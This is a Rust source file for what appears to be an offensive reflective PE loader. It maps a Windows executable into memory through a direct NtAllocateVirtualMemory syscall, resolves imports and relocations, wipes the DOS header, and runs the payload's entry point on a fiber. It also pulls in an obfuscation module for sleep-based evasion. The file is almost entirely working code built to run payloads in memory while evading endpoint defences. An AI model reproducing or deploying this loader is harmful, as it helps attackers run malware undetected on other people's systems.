use pelib::{
    fix_base_relocations, get_dos_header, get_headers_size, get_image_size, get_nt_header,
    write_import_table, write_sections,
};
use utils::detect_platform;
use windows::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

use core::{ffi::c_void, ptr::null_mut};

use crate::main::pelib;
use crate::main::windows;
use crate::{misc::utils, obfus::tricks::make_sleep};

use rust_syscalls::syscall;

use alloc::vec::Vec;

// use super::windows::ConvertThreadToFiber;
// use super::windows::CreateFiber;
// use super::windows::SwitchToFiber;
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

use super::pelib::apply_section_protections;
use super::pelib::clean_dos_header;
use super::pelib::translate_characteristics_to_protection;

fn is_platforms_same(data: Vec<u8>) {
    let platform = detect_platform(&data).unwrap();

    let target_arch = if cfg!(target_arch = "x86_64") { 64 } else { 32 };

    if platform != target_arch {
        panic!("The pltfrm not th sm as the mprted pe.")
    }
}

static mut REFLECTIVE_LOADER_FIBER: *mut c_void = null_mut();
static mut EXECUTION_FIBER: *mut c_void = null_mut();
pub unsafe fn reflective_loader(buffer: Vec<u8>) {
    REFLECTIVE_LOADER_FIBER = ConvertThreadToFiber(null_mut());
    is_platforms_same(buffer.clone());

    // Get the size of the headers and the image
    let headerssize = get_headers_size(&buffer);
    let mut imagesize = get_image_size(&buffer);

    let mut baseptr: *mut c_void = null_mut();

    let _ = syscall!(
        "NtAllocateVirtualMemory",
        -1isize as *mut c_void,
        &mut baseptr,
        0,
        &mut imagesize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    // make_sleep(5).expect("sleep failed");

    // Write the headers to the allocated memory
    core::ptr::copy_nonoverlapping(
        buffer.as_ptr() as *const c_void,
        baseptr as *mut c_void,
        headerssize,
    );
    // Get the DOS header
    let dosheader = get_dos_header(buffer.as_ptr() as *const c_void);

    // Get the NT header IMAGE_NT_HEADERS64|IMAGE_NT_HEADERS32
    let ntheader = get_nt_header(buffer.as_ptr() as *const c_void, dosheader);

    // Write each section to the allocated memory
    let sections_info = write_sections(
        baseptr as *mut c_void, // The base address of the image.
        buffer.clone(),         // The buffer containing the image.
        ntheader,               // The NT header of the image.
        dosheader,              // The DOS header of the image.
    );

    // make_sleep(5).expect("sleep failed");
    // Write the import table to the allocated memory
    write_import_table(baseptr as *mut c_void, ntheader);
    // Fix the base relocations
    fix_base_relocations(baseptr as *mut c_void, ntheader);

    clean_dos_header(baseptr as *mut c_void);

    apply_section_protections(sections_info);
    #[cfg(target_arch = "x86_64")]
    let entrypoint = (baseptr as usize
        + (*(ntheader as *const windows::IMAGE_NT_HEADERS64))
            .OptionalHeader
            .AddressOfEntryPoint as usize) as *const c_void;
    #[cfg(target_arch = "x86")]
    let entrypoint = (baseptr as usize
        + (*(ntheader as *const windows::IMAGE_NT_HEADERS32))
            .OptionalHeader
            .AddressOfEntryPoint as usize) as *const c_void;

    // let _ = unsafe { make_sleep(20000) };
    EXECUTION_FIBER = CreateFiber(0, Some(execute_image), entrypoint as *mut c_void);
    SwitchToFiber(EXECUTION_FIBER);
    // execute_image(entrypoint);

    // Free the allocated memory of baseptr
    let _ = baseptr;
}

extern "system" fn execute_image(entrypoint: *mut c_void) {
    // Call the entry point of the image
    let func: extern "C" fn() -> u32 = unsafe { core::mem::transmute(entrypoint) };
    func();
    // make_sleep(5).expect("sleep failed");
    unsafe { SwitchToFiber(REFLECTIVE_LOADER_FIBER) };
}
